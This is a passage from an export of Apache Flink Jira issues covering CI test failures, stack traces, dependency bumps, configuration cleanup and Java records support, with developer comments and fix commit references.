{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 22:35:10 UTC 2023,,,,,,,,,,"0|z1io1k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Critical but is unassigned and neither itself nor its Sub-Tasks have been updated for 14 days. I have gone ahead and marked it ""stale-critical"". If this ticket is critical, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-critical"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Critical, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
Several jobs failed on AZP with No space left on device,FLINK-32392,13540732,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,renqs,Sergey Nuyanzin,Sergey Nuyanzin,20/Jun/23 10:00,28/Jun/23 06:10,04/Jun/24 20:41,28/Jun/23 06:10,1.16.3,1.17.2,1.18.0,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Test Infrastructure,,,,0,pull-request-available,test-stability,,"This Build failed with no space left https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50162&view=logs&j=585d8b77-fa33-51bc-8163-03e54ba9ce5b
{noformat}
##[error]Unhandled exception. System.IO.IOException: No space left on device : '/home/vsts/agents/3.220.5/_diag/Worker_20230619-021757-utc.log'
   at System.IO.RandomAccess.WriteAtOffset(SafeFileHandle handle, ReadOnlySpan`1 buffer, Int64 fileOffset)
   at System.IO.Strategies.BufferedFileStreamStrategy.FlushWrite()
   at System.IO.StreamWriter.Flush(Boolean flushStream, Boolean flushEncoder)
   at System.Diagnostics.TextWriterTraceListener.Flush()
   at Microsoft.VisualStudio.Services.Agent.HostTraceListener.WriteHeader(String source, TraceEventType eventType, Int32 id) in /home/vsts/work/1/s/src/Microsoft.VisualStudio.Services.Agent/HostTraceListener.cs:line 151
   at Microsoft.VisualStudio.Services.Agent.HostTraceListener.TraceEvent(TraceEventCache eventCache, String source, TraceEventType eventType, Int32 id, String message) in /home/vsts/work/1/s/src/Microsoft.VisualStudio.Services.Agent/HostTraceListener.cs:line 81
   at System.Diagnostics.TraceSource.TraceEvent(TraceEventType eventType, Int32 id, String message)
   at Microsoft.VisualStudio.Services.Agent.Util.ProcessInvoker.ProcessExitedHandler(Object sender, EventArgs e) in /home/vsts/work/1/s/src/Agent.Sdk/ProcessInvoker.cs:line 496
   at System.Diagnostics.Process.OnExited()
   at System.Diagnostics.Process.RaiseOnExited()
   at System.Diagnostics.Process.CompletionCallback(Object waitHandleContext, Boolean wasSignaled)
   at System.Threading._ThreadPoolWaitOrTimerCallback.WaitOrTimerCallback_Context_f(Object state)
   at System.Threading.ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state)
--- End of stack trace from previous location ---
   at System.Threading._ThreadPoolWaitOrTimerCallback.PerformWaitOrTimerCallback(_ThreadPoolWaitOrTimerCallback helper, Boolean timedOut)
   at System.Threading.PortableThreadPool.CompleteWait(RegisteredWaitHandle handle, Boolean timedOut)
   at System.Threading.ThreadPoolWorkQueue.Dispatch()
   at System.Threading.PortableThreadPool.WorkerThread.WorkerThreadStart()
,##[error]The hosted runner encountered an error while running your job. (Error Type: Failure).
{noformat}
for 1.16, 1.17 it happens while   'Upload artifacts to S3'
for 1.18 while 'Deploy maven snapshot'",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 27 09:13:04 UTC 2023,,,,,,,,,,"0|z1io1c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"20/Jun/23 10:11;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50150&view=logs&j=eca6b3a6-1600-56cc-916a-c549b3cde3ff;;;","20/Jun/23 10:12;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50151&view=logs&s=9fca669f-5c5f-59c7-4118-e31c641064f0&j=585d8b77-fa33-51bc-8163-03e54ba9ce5b;;;","20/Jun/23 10:17;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50149&view=logs&j=eca6b3a6-1600-56cc-916a-c549b3cde3ff&t=7b3c1df5-9194-5183-5ebd-5567f52d5f8f&l=23712;;;","20/Jun/23 10:32;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50130&view=logs&j=eca6b3a6-1600-56cc-916a-c549b3cde3ff&t=7b3c1df5-9194-5183-5ebd-5567f52d5f8f&l=23711;;;","20/Jun/23 10:34;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50071&view=logs&j=585d8b77-fa33-51bc-8163-03e54ba9ce5b;;;","20/Jun/23 10:40;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50070&view=logs&j=eca6b3a6-1600-56cc-916a-c549b3cde3ff&t=7b3c1df5-9194-5183-5ebd-5567f52d5f8f;;;","26/Jun/23 04:39;renqs;Some investigations:
 * The case only happens on Microsoft-hosted agents, whose limit on disk space is 10GB.
 * The local Maven repo (.m2) is cached across pipeline runs, which is ~15GB currently, and it kept growing in the past year. 

I think the root cause is that the cached local Maven repo has a lot of outdated dependencies and never get cleared. I created a PR to invalidate the cache per year so that the size of local Maven repo won't grow indefinitely. ;;;","26/Jun/23 09:38;renqs;Fixed on master: 9b63099964b36ad9d78649bb6f5b39473e0031bd;;;","26/Jun/23 22:23;Sergey Nuyanzin;1.17.x: https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50397&view=logs&j=585d8b77-fa33-51bc-8163-03e54ba9ce5b&t=68e20e55-906c-5c49-157c-3005667723c9;;;","27/Jun/23 09:13;renqs;Backport to 1.17: 0740649c714b50b83572f14300132fd1a1c41ea8

1.16: 020990a86e78f6ee12f23ea6fb152baf6226947a;;;",,,,,,,,,,,,,
YARNSessionFIFOITCase.checkForProhibitedLogContents fails on AZP on Java 17,FLINK-32391,13540731,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,ferenc-csaky,Sergey Nuyanzin,Sergey Nuyanzin,20/Jun/23 09:55,30/Nov/23 11:39,04/Jun/24 20:41,06/Jul/23 18:22,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Deployment / YARN,Tests,,,0,pull-request-available,test-stability,,"This build failed https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50217&view=logs&j=d871f0ce-7328-5d00-023b-e7391f5801c8&t=77cbea27-feb9-5cf5-53f7-3267f9f9c6b6&l=27971
as 
{noformat}
Jun 20 01:30:32 01:30:32.994 [ERROR] Tests run: 2, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 79.015 s <<< FAILURE! - in org.apache.flink.yarn.YARNSessionFIFOSecuredITCase
Jun 20 01:30:32 01:30:32.994 [ERROR] org.apache.flink.yarn.YARNSessionFIFOSecuredITCase.testDetachedMode  Time elapsed: 17.586 s  <<< FAILURE!
Jun 20 01:30:32 java.lang.AssertionError: 
Jun 20 01:30:32 Found a file /__w/2/s/flink-yarn-tests/target/test/data/flink-yarn-tests-fifo-secured/yarn-23119131678/flink-yarn-tests-fifo-secured-logDir-nm-1_0/application_1687224557882_0002/container_1687224557882_0002_01_000002/taskmanager.log with a prohibited string (one of [Exception, Started SelectChannelConnector@0.0.0.0:8081]). Excerpts:
Jun 20 01:30:32 [
Jun 20 01:30:32 2023-06-20 01:29:57,749 INFO  org.apache.flink.runtime.rpc.akka.AkkaRpcService             [] - Stopping Akka RPC service.
Jun 20 01:30:32 2023-06-20 01:29:57,767 WARN  akka.actor.CoordinatedShutdown                               [] - Could not addJvmShutdownHook, due to: Shutdown in progress
Jun 20 01:30:32 2023-06-20 01:29:57,767 INFO  akka.actor.CoordinatedShutdown                               [] - Running CoordinatedShutdown with reason [ActorSystemTerminateReason]
Jun 20 01:30:32 2023-06-20 01:29:57,768 WARN  akka.actor.CoordinatedShutdown                               [] - Could not addJvmShutdownHook, due to: Shutdown in progress
Jun 20 01:30:32 2023-06-20 01:29:57,768 INFO  akka.actor.CoordinatedShutdown                               [] - Running CoordinatedShutdown with reason [ActorSystemTerminateReason]
Jun 20 01:30:32 2023-06-20 01:29:57,781 INFO  akka.remote.RemoteActorRefProvider$RemotingTerminator        [] - Shutting down remote daemon.
Jun 20 01:30:32 2023-06-20 01:29:57,781 INFO  akka.remote.RemoteActorRefProvider$RemotingTerminator        [] - Shutting down remote daemon.
Jun 20 01:30:32 2023-06-20 01:29:57,782 INFO  akka.remote.RemoteActorRefProvider$RemotingTerminator        [] - Remote daemon shut down; proceeding with flushing remote transports.
Jun 20 01:30:32 2023-06-20 01:29:57,782 INFO  akka.remote.RemoteActorRefProvider$RemotingTerminator        [] - Remote daemon shut down; proceeding with flushing remote transports.
Jun 20 01:30:32 2023-06-20 01:29:57,788 WARN  akka.remote.transport.netty.NettyTransport                   [] - Remote connection to [264d5b384bcc/192.168.224.2:42920] failed with java.net.SocketException: Connection reset
Jun 20 01:30:32 2023-06-20 01:29:57,788 WARN  akka.remote.transport.netty.NettyTransport                   [] - Remote connection to [264d5b384bcc/192.168.224.2:42920] failed with java.net.SocketException: Connection reset
Jun 20 01:30:32 ]
{noformat}
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Nov 30 11:39:56 UTC 2023,,,,,,,,,,"0|z1io14:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"27/Jun/23 12:18;ferenc-csaky;Hey! I can take a look at this, feel free to assign it to me.;;;","27/Jun/23 12:24;Sergey Nuyanzin;thanks [~ferenc-csaky] 
assigned to you;;;","06/Jul/23 18:22;chesnay;master: cc804944c7579635355d5fb9675a5d4c10fc814d;;;","30/Nov/23 11:39;Sergey Nuyanzin;There is an occurrence for 1.17
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=55043&view=logs&j=fc5181b0-e452-5c8f-68de-1097947f6483&t=995c650b-6573-581c-9ce6-7ad4cc038461&l=27742

I think we need to create a backport for that;;;",,,,,,,,,,,,,,,,,,,
[Dependabot] Bump socket.io-parser and socket.io and engine.io,FLINK-32390,13540720,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,martijnvisser,martijnvisser,martijnvisser,20/Jun/23 08:27,04/Jul/23 07:23,04/Jun/24 20:41,04/Jul/23 07:23,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Web Frontend,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 07:23:57 UTC 2023,,,,,,,,,,"0|z1inyo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"04/Jul/23 07:23;martijnvisser;Fixed in:

apache/flink:master 4b61e4b79e36100d3bbc9673a03aa18ec712d709;;;",,,,,,,,,,,,,,,,,,,,,,
[Dependabot] Bump guava from 27.0.1-jre to 32.0.0-jre,FLINK-32389,13540719,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,martijnvisser,martijnvisser,martijnvisser,20/Jun/23 08:26,27/Jun/23 11:34,04/Jun/24 20:41,27/Jun/23 11:34,,,,,,,,,,,,,,,1.18.0,,,,,,"Formats (JSON, Avro, Parquet, ORC, SequenceFile)",,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 27 11:34:25 UTC 2023,,,,,,,,,,"0|z1inyg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"27/Jun/23 11:34;martijnvisser;Fixed in apache/flink:master - 6ebd9f3a5c9b387a5e89c9e77fe0889e28dc2aef;;;",,,,,,,,,,,,,,,,,,,,,,
Add the ability to pass parameters to CUSTOM PartitionCommitPolicy,FLINK-32388,13540717,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,garycao,garycao,20/Jun/23 08:13,05/Jul/23 12:10,04/Jun/24 20:41,05/Jul/23 12:10,,,,,,,,,,,,,,,,,,,,,Connectors / FileSystem,,,,0,pull-request-available,,,"By allowing the passing of parameters, the custom PartitionCommitPolicy becomes more flexible and customizable. This enables user to enhance their custom PartitionCommitPolicy by including additional functionality, such as passing monitoring parameters to track the files associated with each commit.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 05 12:10:51 UTC 2023,,,,,,,,,,"0|z1iny0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jul/23 12:10;luoyuxia;master:

ec222eae3f6f501d8681a40a7c528003e1006736

Thanks for the pr.;;;",,,,,,,,,,,,,,,,,,,,,,
InputGateDeploymentDescriptor uses cache to avoid deserializing shuffle descriptors multiple times,FLINK-32387,13540681,13535621,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,huwh,huwh,huwh,20/Jun/23 03:32,23/Jul/23 08:21,04/Jun/24 20:41,23/Jul/23 08:21,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"InputGateDeploymentDescriptor uses cache to avoid deserializing shuffle descriptors multiple times.

The cache only affects when the shuffle descriptors are offloaded by the blob server. This means the shuffle descriptors size is large enough to use caches.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 23 08:21:17 UTC 2023,,,,,,,,,,"0|z1inq0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jul/23 08:21;wanglijie;Done via master(1.18): 7a9efbff0a2ea3e4e736c48a57a362cc9c5bbf37;;;",,,,,,,,,,,,,,,,,,,,,,
Add ShuffleDescriptorsCache in TaskExecutor to cache ShuffleDescriptors,FLINK-32386,13540680,13535621,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,huwh,huwh,huwh,20/Jun/23 03:28,23/Jul/23 08:21,04/Jun/24 20:41,23/Jul/23 08:20,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"Introduce a new struct named ShuffleDescriptorsCache to cache ShuffleDescriptorAndIndex which are offloaded by the blob server. 

The cache should have the following capabilities:

1. Expired after exceeding the TTL.
2. Limit the size of the cache. Remove the oldest element from the cache when its maximum size has been exceeded.
3. Clear elements belong to a job when it disconnects from TaskExecutor.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 23 08:20:46 UTC 2023,,,,,,,,,,"0|z1inps:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jul/23 08:20;wanglijie;Done via master(1.18): 4d642635c9409883724bd0127f2a00ef14993bf0;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce a struct SerializedShuffleDescriptorAndIndices to identify a group of ShuffleDescriptorAndIndex,FLINK-32385,13540677,13535621,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,huwh,huwh,huwh,20/Jun/23 03:15,23/Jul/23 08:21,04/Jun/24 20:41,23/Jul/23 08:20,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"Introduce a new struct named SerializedShuffleDescriptorAndIndices to identify a group of ShuffleDescriptorAndIndex. 

Then we could cache these ShuffleDescriptorAndIndex in TaskExecutor side",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 23 08:20:10 UTC 2023,,,,,,,,,,"0|z1inp4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jul/23 08:20;wanglijie;Done via master(1.18): fa4518960fd009531a584ca5450604649e94bac0;;;",,,,,,,,,,,,,,,,,,,,,,
Remove deprecated configuration keys which violate YAML spec,FLINK-32384,13540675,13540672,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,zhuzh,zhuzh,20/Jun/23 02:40,03/Jun/24 08:33,04/Jun/24 20:41,,,,,,,,,,,,,,,,2.0.0,,,,,,Runtime / Configuration,,,,0,2.0-related,,,"In FLINK-29372, key that violate YAML spec are renamed to a valid form and the old names are deprecated.
In Flink 2.0 we should remove these deprecated keys. This will prevent users (unintentionally) to create invalid YAML form flink-conf.yaml.
Then with the work of FLINK-23620,  we can remove the non-standard YAML parsing logic and enforce standard YAML validation in CI.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 03 08:33:54 UTC 2024,,,,,,,,,,"0|z1inoo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/May/24 09:43;kartikeypant;Hello [~zhuzh], I am eager to start contributing to the Apache Flink community. May I take on this issue to work on?;;;","30/May/24 14:30;zhuzh;Thanks for volunteering to contribute to Flink. [~kartikeypant]
However, this is a breaking change. Therefore, we cannot do it until Flink 1.20 is released and release cycle of Flink 2.0 is started.
You are welcome to take this task if you are free at that moment.
Before that, you can take a look at other tickets.;;;","03/Jun/24 08:33;kartikeypant;Sure [~zhuzh], will do;;;",,,,,,,,,,,,,,,,,,,,
2.0 Breaking configuration changes,FLINK-32383,13540672,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,,,zhuzh,zhuzh,20/Jun/23 02:11,01/Dec/23 03:09,04/Jun/24 20:41,,,,,,,,,,,,,,,,2.0.0,,,,,,Runtime / Configuration,,,,0,2.0-related,,,Umbrella issue for all breaking changes to Flink configuration.,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-23620,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-20 02:11:54.0,,,,,,,,,,"0|z1ino0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SQL JDBC e2e test failed with FlinkJobNotFoundException,FLINK-32382,13540646,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,mapohl,mapohl,19/Jun/23 15:36,19/Jun/23 15:43,04/Jun/24 20:41,19/Jun/23 15:43,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,Table SQL / API,,,0,test-stability,,,"I ran into a test instability in [this CI build|https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50203&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d&l=3237] while working on FLINK-32180 (leader election refactoring). The e2e test {{Sql Jdbc Driver end-to-end test}} failed with a {{FlinkJobNotFoundException}}:

{code}
org.apache.flink.runtime.messages.FlinkJobNotFoundException: Could not find Flink job (095927e6f6ef3684f3a1ae13e5451184)
        at org.apache.flink.runtime.dispatcher.Dispatcher.getJobMasterGateway(Dispatcher.java:1450) ~[flink-dist-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at org.apache.flink.runtime.dispatcher.Dispatcher.performOperationOnJobMasterGateway(Dispatcher.java:1465) ~[flink-dist-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at org.apache.flink.runtime.dispatcher.Dispatcher.deliverCoordinationRequestToCoordinator(Dispatcher.java:1088) ~[flink-dist-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_372]
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_372]
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_372]
        at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_372]
        at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.lambda$handleRpcInvocation$1(AkkaRpcActor.java:309) ~[?:?]
        at org.apache.flink.runtime.concurrent.akka.ClassLoadingUtils.runWithContextClassLoader(ClassLoadingUtils.java:83) ~[?:?]
        at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleRpcInvocation(AkkaRpcActor.java:307) ~[?:?]
        at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleRpcMessage(AkkaRpcActor.java:222) ~[?:?]
        at org.apache.flink.runtime.rpc.akka.FencedAkkaRpcActor.handleRpcMessage(FencedAkkaRpcActor.java:84) ~[?:?]
        at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleMessage(AkkaRpcActor.java:168) ~[?:?]
        at akka.japi.pf.UnitCaseStatement.apply(CaseStatements.scala:24) ~[?:?]
        at akka.japi.pf.UnitCaseStatement.apply(CaseStatements.scala:20) ~[?:?]
        at scala.PartialFunction.applyOrElse(PartialFunction.scala:127) ~[flink-scala_2.12-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at scala.PartialFunction.applyOrElse$(PartialFunction.scala:126) ~[flink-scala_2.12-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at akka.japi.pf.UnitCaseStatement.applyOrElse(CaseStatements.scala:20) ~[?:?]
        at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:175) ~[flink-scala_2.12-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:176) ~[flink-scala_2.12-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:176) ~[flink-scala_2.12-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at akka.actor.Actor.aroundReceive(Actor.scala:537) ~[?:?]
        at akka.actor.Actor.aroundReceive$(Actor.scala:535) ~[?:?]
        at akka.actor.AbstractActor.aroundReceive(AbstractActor.scala:220) ~[?:?]
        at akka.actor.ActorCell.receiveMessage(ActorCell.scala:579) ~[?:?]
        at akka.actor.ActorCell.invoke(ActorCell.scala:547) ~[?:?]
        at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:270) ~[?:?]
        at akka.dispatch.Mailbox.run(Mailbox.scala:231) ~[?:?]
        at akka.dispatch.Mailbox.exec(Mailbox.scala:243) ~[?:?]
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) [?:1.8.0_372]
        at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) [?:1.8.0_372]
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) [?:1.8.0_372]
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175) [?:1.8.0_372]
{code}

I cannot rule out that it's an issue being caused by the FLINK-32180 refactoring. But I didn't find any hints in the logs. [~zjureel] may you have a look at this one as well?",,,,,,,,,,,,,,,,,,,,FLINK-32370,,,,,,FLINK-31673,,,,FLINK-32180,,"19/Jun/23 15:36;mapohl;logs-ci-e2e_2_ci-1687181689.zip;https://issues.apache.org/jira/secure/attachment/13059277/logs-ci-e2e_2_ci-1687181689.zip",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-19 15:36:25.0,,,,,,,,,,"0|z1ini8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Replaces error handling functionality with onError method in MultipleComponentLeaderElectionDriver.Listener interface,FLINK-32381,13540598,13432464,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,19/Jun/23 09:55,07/Jul/23 09:31,04/Jun/24 20:41,07/Jul/23 09:31,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,The communication between the {{DefaultLeaderElectionService}} and the driver can be improved in a way that errors are forwarded by the driver through the {{Listener}} interface rather than holding the service's error handler.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 07 09:31:18 UTC 2023,,,,,,,,,,"0|z1in7k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"07/Jul/23 09:31;mapohl;master: 174cf255a50a7f9519e66ccb42eb6974690a6201;;;",,,,,,,,,,,,,,,,,,,,,,
Support Java records,FLINK-32380,13540595,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,gyfora,chesnay,chesnay,19/Jun/23 09:25,14/Nov/23 12:40,04/Jun/24 20:41,10/Nov/23 07:55,,,,,,,,,,,,,,,1.19.0,,,,,,API / Type Serialization System,,,,0,pull-request-available,,,"Reportedly Java records are not supported, because they are neither detected by our Pojo serializer nor supported by Kryo 2.x",,,,,,,,,,,,,,,,,,,,,,,FLINK-33543,,,,,,,,FLINK-33342,"13/Nov/23 02:19;xuyangzhong;image-2023-11-13-10-19-06-035.png;https://issues.apache.org/jira/secure/attachment/13064354/image-2023-11-13-10-19-06-035.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Nov 13 07:41:00 UTC 2023,,,,,,,,,,"0|z1in6w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 09:54;chesnay;Moved out of FLINK-15736 because it doesn't prevent Flink from running on Java 17.;;;","10/Nov/23 07:55;gyfora;Merged to master  ba752b9e8b3fa0fbbe67d6d1bd70cccbc74e6ca0;;;","13/Nov/23 02:19;xuyangzhong;Hi, [~gyfora] Sorry for this noise. When I rebased master that contains this pr, use mvn clean/install to build the whole project and re-run tests, the idea failed to build with missing class `PojoToRecordVerifier.PojoAfterUpgrade`. I still use jdk8, and I think that is the root cause. Is any way I can work around it in addition to upgrading jdk?  !image-2023-11-13-10-19-06-035.png|width=1031,height=613!;;;","13/Nov/23 04:07;gyfora;Technically speaking we exclude these using the compiler plugin, but unfortunately IntelliJ doesn't respect this:
[https://youtrack.jetbrains.com/issue/IDEA-87868]

you could check [https://stackoverflow.com/questions/14792798/how-to-make-intellijidea-ignore-work-in-progress-class-files] on how to exclude individual classes. 

Or simply bump the java version for development;;;","13/Nov/23 07:41;xuyangzhong;[~gyfora] Thanks for your quick reply! I'll try it.;;;",,,,,,,,,,,,,,,,,,
Skip archunit tests in java1X-target profiles,FLINK-32379,13540594,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
